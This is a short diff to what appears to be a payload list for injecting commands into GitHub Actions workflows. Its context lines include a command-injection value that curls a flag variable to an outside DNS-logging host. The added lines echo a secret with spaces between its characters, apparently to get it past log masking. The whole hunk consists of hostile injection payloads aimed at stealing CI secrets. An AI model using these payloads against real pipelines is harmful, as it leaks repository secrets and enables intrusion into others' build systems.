@@ -584,3 +584,5 @@ ${{ env.flag }}
 ${{ env[FLAG] }}
 ${{ env.FLAG }}
 "; curl $flag.sxhx72.dnslog.cn"
+zwh-china:
+$(echo $secrets.FLAG | sed 's/./& /g')
